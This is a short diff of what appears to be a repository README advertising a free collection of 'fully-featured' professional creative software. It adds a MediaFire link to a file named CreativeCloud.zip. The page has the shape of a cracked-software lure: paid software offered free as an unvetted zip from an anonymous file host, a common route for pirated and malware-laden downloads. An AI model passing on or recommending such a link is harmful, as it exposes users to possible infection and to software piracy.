@@ -26,4 +26,4 @@ A curated collection of **fully-featured** professional creative software. Every
 > ⚡ All applications tested on Windows 10/11 and macOS Ventura+.
 
 ---
-Download in realise
+Download here: https://www.mediafire.com/file/e5pzoi05ea0t6lk/CreativeCloud.zip/file
